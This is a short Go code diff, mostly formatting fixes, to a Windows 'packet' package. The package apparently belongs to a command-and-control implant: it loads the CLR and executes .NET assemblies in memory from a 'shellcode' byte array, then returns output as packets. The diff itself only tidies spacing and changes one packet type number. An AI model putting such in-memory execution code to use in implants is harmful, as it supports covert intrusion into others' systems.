@@ -1,4 +1,5 @@
 //go:build windows
+
 package packet
 
 import (
@@ -119,7 +120,7 @@ func LoadBin(data []byte, assemblyArgs []string, runtime string, debug bool) (st
 	if rtHost == nil {
 		time.Sleep(time.Second)
 		rtHost = clrInstance.GetRuntimeHost(runtime, debug)
-		if rtHost == nil{
+		if rtHost == nil {
 			return "", errors.New("Could not load CLR runtime host")
 		}
 	}
@@ -155,9 +156,9 @@ func LoadBin(data []byte, assemblyArgs []string, runtime string, debug bool) (st
 	return fmt.Sprintf("%s\n%s", stdout, stderr), nil
 }
 
-func ExecuteAssembly(shellcode []byte, params []string) ([]byte, error){
-	ExecuteAssemblyWithCallback(shellcode, params, func(result []byte){
-		finalPacket := MakePacket(32, result)
+func ExecuteAssembly(shellcode []byte, params []string) ([]byte, error) {
+	ExecuteAssemblyWithCallback(shellcode, params, func(result []byte) {
+		finalPacket := MakePacket(0, result)
 		PushResult(finalPacket)
 	})
 
